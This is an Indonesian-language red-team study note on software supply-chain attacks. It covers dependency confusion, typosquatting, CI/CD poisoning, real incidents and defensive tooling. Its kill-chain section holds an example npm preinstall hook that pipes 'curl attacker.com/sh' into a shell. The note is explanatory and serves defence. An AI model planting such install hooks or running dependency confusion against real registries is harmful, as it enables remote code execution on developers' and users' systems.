---
title: Attack Perspective — Supply Chain (Red Team Deepdive)
tags: [attack,red-team,supply-chain,dependency-confusion,sbom,slsa,typosquatting]
source: supply-chain-attack-detection-with-sbom.md
status: complete
---
cssclasses:
  - wide-table
  - callout

# Supply Chain Attack — Perspektif Penyerang

> Supply chain = serang trusted channel, bukan target langsung. Tipe: dependency confusion, typosquatting, CI/CD poison, compromised update, malicious PR.

## 1. Attack Vector Supply Chain

| Vektor | MITRE ID | Konkret | Tool / CVE | Evasion | Detection Gap |
|--------|----------|---------|------------|---------|----------------|
| **Dependency Confusion** | T1195.001 | Publish package nama internal ke public registry | npm/pip/PyPI publish | Package = valid | SBOM audit jarang |
| **Typosquatting** | T1195.001 | Package nama mirip (fastapi vs fast-api) | npm, PyPI, crates.io | Name = valid package | Developer tidak audit dependency |
| **CI/CD Poison** | T1195.002 | Inject code ke build pipeline | GitHub Actions, GitLab CI | Signed commit (stolen token) | CI/CD log audit jarang |
| **Compromised Update** | T1195.002 | Hijack update server → malicious update | SolarWinds, 3CX | Signed binary (stolen cert) | Signing trust cert not behavior |
| **Malicious PR** | T1195.002 | Open source contribution → hidden code | GitHub PR | Social engineering | Code review miss subtle |
| **Base Image** | T1195.002 | Malicious Docker base image | Docker Hub | Image = valid tag | Image scan = post-deploy |
| **SBOM Gap** | T1195.001 | SBOM tidak verify behavior | CycloneDX/SPDX | SBOM = generate only | Behavior audit = rare |

## 2. Dependency Confusion Kill Chain

```
Recon: Identifikasi internal package name
  ├── package.json → @company/internal-name
  ├── requirements.txt → internal package
  └→ go.mod → private module path
    ↓
Publish: Package nama SAMA ke public registry
  ├── npm: npm publish --access public
  ├── PyPI: upload
  └→ GitLab/GitHub Package Registry
    ↓
Resolution: Build system → public registry > private registry
  ├── npm default → public > private
  ├── pip → PyPI > private (jika tidak pinned)
  └→ Go → GOPROXY public (jika tidak checksum)
    ↓
Execute: Install script (preinstall/postinstall) → RCE
  ├── npm: "preinstall": "curl attacker.com/sh | sh"
  ├── pip: setup.py → subprocess
  └→ Go: build.rs → arbitrary command
    ↓
Persistence: Artifact infected → deploy → production → C2
```

## 3. Kasus Nyata

| Kasus | Impact | Teknik | Lesson |
|-------|--------|--------|--------|
| SolarWinds (SUNBURST) | Global compromise (18K+ customer) | Compromised update → signed DLL | Code signing ≠ security |
| 3CX | 600K+ install, Lazarus | Compromised dependency → cascade | Trust chain broken at dependency |
| XZ Utils (CVE-2024-3094) | SSH backdoor | Multi-year social engineering → build backdoor | Maintainer trust = SPOF |
| event-stream (npm) | Wallet theft (Copay) | Maintainer handoff → malicious update | Maintainer = single point |
| Codecov | CI credential theft | Modified bash uploader → exfil env vars | CI token = silent theft |

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **confUSED** | Dependency confusion PoC |
| **trivy / grype** | Dependency + image vuln scan |
| **Syft** | SBOM generation |
| **Sigstore / cosign** | Artifact signing (defender) |
| **TruffleHog / GitLeaks** | Secret scan (CI token, API key) |

## 5. Referensi
- SLSA — https://slsa.dev/
- Sigstore — https://www.sigstore.dev/
- CycloneDX — https://cyclonedx.org/
- SolarWinds (CISA) — https://www.cisa.gov/news-events/cyber-advisories/aa21-077a
- XZ Utils (CVE-2024-3094) — https://nvd.nist.gov/vuln/detail/CVE-2024-3094